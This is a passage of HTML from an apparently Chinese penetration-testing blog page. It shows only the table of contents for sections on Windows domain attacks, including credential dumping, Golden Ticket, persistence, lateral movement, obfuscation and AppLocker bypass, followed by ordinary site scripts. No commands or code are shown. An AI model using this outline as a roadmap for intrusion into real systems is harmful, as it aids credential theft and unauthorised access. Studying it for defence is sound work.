href="#5-17-如果管理员-系统，则使用Mimikatz解密EFS文件"><span class="toc_mobile_items-number">6.17.</span> <span class="toc_mobile_items-text">5.17 如果管理员/系统，则使用Mimikatz解密EFS文件</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#5-18-UAC绕过"><span class="toc_mobile_items-number">6.18.</span> <span class="toc_mobile_items-text">5.18 UAC绕过</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#5-19-Golden-Ticket-Attack"><span class="toc_mobile_items-number">6.19.</span> <span class="toc_mobile_items-text">5.19 Golden Ticket Attack</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#5-20-子域将危害森林"><span class="toc_mobile_items-number">6.20.</span> <span class="toc_mobile_items-text">5.20 子域将危害森林</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#5-21-Dump-NTDS-dit"><span class="toc_mobile_items-number">6.21.</span> <span class="toc_mobile_items-text">5.21 Dump NTDS.dit</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#5-22-SeBackupPrivlege-Dump-NTDS-dit"><span class="toc_mobile_items-number">6.22.</span> <span class="toc_mobile_items-text">5.22 SeBackupPrivlege - Dump NTDS.dit</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#0x06-权限维持"><span class="toc_mobile_items-number">7.</span> <span class="toc_mobile_items-text">0x06 权限维持</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#6-1-SSH-Shuttle"><span class="toc_mobile_items-number">7.1.</span> <span class="toc_mobile_items-text">6.1 SSH Shuttle</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#6-2-SharPersist"><span class="toc_mobile_items-number">7.2.</span> <span class="toc_mobile_items-text">6.2 SharPersist</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#6-3-SharpDoor"><span class="toc_mobile_items-number">7.3.</span> <span class="toc_mobile_items-text">6.3 SharpDoor</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#6-4-自动运行注册表"><span class="toc_mobile_items-number">7.4.</span> <span class="toc_mobile_items-text">6.4 自动运行注册表</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#6-5-Run-amp-Run-Once"><span class="toc_mobile_items-number">7.5.</span> <span class="toc_mobile_items-text">6.5 Run &amp; Run Once</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#6-6-计划任务"><span class="toc_mobile_items-number">7.6.</span> <span class="toc_mobile_items-text">6.6 计划任务</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#6-7-Windows启动文件夹"><span class="toc_mobile_items-number">7.7.</span> <span class="toc_mobile_items-text">6.7 Windows启动文件夹</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#6-8-EXE-DLL劫持"><span class="toc_mobile_items-number">7.8.</span> <span class="toc_mobile_items-text">6.8 EXE / DLL劫持</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#6-9-添加用户帐号"><span class="toc_mobile_items-number">7.9.</span> <span class="toc_mobile_items-text">6.9 添加用户帐号</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#6-10-Kerberos的持久性"><span class="toc_mobile_items-number">7.9.0.1.</span> <span class="toc_mobile_items-text">6.10 Kerberos的持久性</span></a></li></ol></li></ol></li></ol><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#0x07-横向运动"><span class="toc_mobile_items-number">8.</span> <span class="toc_mobile_items-text">0x07 横向运动</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#7-1-Plink"><span class="toc_mobile_items-number">8.1.</span> <span class="toc_mobile_items-text">7.1 Plink</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#7-2-Powershell端口转发"><span class="toc_mobile_items-number">8.2.</span> <span class="toc_mobile_items-text">7.2 Powershell端口转发</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#7-3-Invoke-SocksProxy"><span class="toc_mobile_items-number">8.3.</span> <span class="toc_mobile_items-text">7.3 Invoke-SocksProxy</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#7-4-Socat-for-Windows"><span class="toc_mobile_items-number">8.4.</span> <span class="toc_mobile_items-text">7.4 Socat for Windows</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#7-5-SharpExec"><span class="toc_mobile_items-number">8.5.</span> <span class="toc_mobile_items-text">7.5 SharpExec</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#7-6-安全套接字漏斗"><span class="toc_mobile_items-number">8.6.</span> <span class="toc_mobile_items-text">7.6 安全套接字漏斗</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#7-7-凿子（通过SSH保护的HTTP上的快速TCP隧道）"><span class="toc_mobile_items-number">8.7.</span> <span class="toc_mobile_items-text">7.7 凿子（通过SSH保护的HTTP上的快速TCP隧道）</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#7-8-CrackMapExec"><span class="toc_mobile_items-number">8.8.</span> <span class="toc_mobile_items-text">7.8 CrackMapExec</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#7-9-WMIC-Spawn-Process"><span class="toc_mobile_items-number">8.9.</span> <span class="toc_mobile_items-text">7.9 WMIC Spawn Process</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#7-10-WinRS"><span class="toc_mobile_items-number">8.10.</span> <span class="toc_mobile_items-text">7.10 WinRS</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#7-11-Invoke-WMIExec-ps1"><span class="toc_mobile_items-number">8.11.</span> <span class="toc_mobile_items-text">7.11 Invoke-WMIExec.ps1</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#7-12-Powershell调用命令（需要端口5985）"><span class="toc_mobile_items-number">8.12.</span> <span class="toc_mobile_items-text">7.12 Powershell调用命令（需要端口5985）</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#7-13-PSExec"><span class="toc_mobile_items-number">8.13.</span> <span class="toc_mobile_items-text">7.13 PSExec</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#7-14-Powershell-Remoting"><span class="toc_mobile_items-number">8.14.</span> <span class="toc_mobile_items-text">7.14 Powershell Remoting</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#7-15-通过SMB配置远程服务（在目标计算机上需要本地管理员）"><span class="toc_mobile_items-number">8.15.</span> <span class="toc_mobile_items-text">7.15 通过SMB配置远程服务（在目标计算机上需要本地管理员）</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#7-16-Pass-The-Hash"><span class="toc_mobile_items-number">8.16.</span> <span class="toc_mobile_items-text">7.16 Pass-The-Hash</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#7-17-Pass-The-Ticket"><span class="toc_mobile_items-number">8.17.</span> <span class="toc_mobile_items-text">7.17 Pass-The-Ticket</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#0x08-混淆-规避技术"><span class="toc_mobile_items-number">9.</span> <span class="toc_mobile_items-text">0x08 混淆/规避技术</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#8-1-调用混淆"><span class="toc_mobile_items-number">9.1.</span> <span class="toc_mobile_items-text">8.1 调用混淆</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#8-2-调用-CradleCraft"><span class="toc_mobile_items-number">9.2.</span> <span class="toc_mobile_items-text">8.2 调用-CradleCraft</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#8-3-调用DOSfuscation"><span class="toc_mobile_items-number">9.3.</span> <span class="toc_mobile_items-text">8.3 调用DOSfuscation</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#8-4-Unicorn"><span class="toc_mobile_items-number">9.4.</span> <span class="toc_mobile_items-text">8.4 Unicorn</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#0x09-AppLocker-约束模式绕过"><span class="toc_mobile_items-number">10.</span> <span class="toc_mobile_items-text">0x09 AppLocker /约束模式绕过</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#9-1-验证您是否处于受限模式"><span class="toc_mobile_items-number">10.1.</span> <span class="toc_mobile_items-text">9.1 验证您是否处于受限模式</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#9-2-Powershell非常少旁路"><span class="toc_mobile_items-number">10.2.</span> <span class="toc_mobile_items-text">9.2 Powershell非常少旁路</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#9-3-世界可写文件夹（在Windows-10-1803上为默认）"><span class="toc_mobile_items-number">10.3.</span> <span class="toc_mobile_items-text">9.3 世界可写文件夹（在Windows 10 1803上为默认）</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#9-4-降级攻击"><span class="toc_mobile_items-number">10.4.</span> <span class="toc_mobile_items-text">9.4 降级攻击</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#9-5-AppLocker-COR配置文件绕过"><span class="toc_mobile_items-number">10.5.</span> <span class="toc_mobile_items-text">9.5 AppLocker COR配置文件绕过</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#9-6-MSBuild-Powershell-CMD旁路"><span class="toc_mobile_items-number">10.6.</span> <span class="toc_mobile_items-text">9.6 MSBuild Powershell / CMD旁路</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#9-7-PSAttack"><span class="toc_mobile_items-number">10.7.</span> <span class="toc_mobile_items-text">9.7 PSAttack</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#9-8-NoPowerShell"><span class="toc_mobile_items-number">10.8.</span> <span class="toc_mobile_items-text">9.8 NoPowerShell</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#9-9-runDLL32绕过"><span class="toc_mobile_items-number">10.9.</span> <span class="toc_mobile_items-text">9.9 runDLL32绕过</span></a></li></ol></li></div></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/js-cookie@2/src/js.cookie.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script async src="/js/search/local-search.js"></script><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="/js/third-party/fireworks.js"></script><script src="/js/nightshift.js"></script><script id="ribbon" src="/js/third-party/canvas-ribbon.js" size="150" alpha="0.6" zindex="-1" data-click="false"></script><script src="/js/activate-power-mode.js"></script><script>POWERMODE.colorful = true; // make power mode colorful
POWERMODE.shake = true; // turn off shake
document.body.addEventListener('input', POWERMODE);
</script><script src="/js/tw_cn.js"></script><script>translateInitilization()

</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@1.2.2/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script><script>const observer = lozad(); // lazy loads elements with default selector as '.lozad'
observer.observe();</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a>
 <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>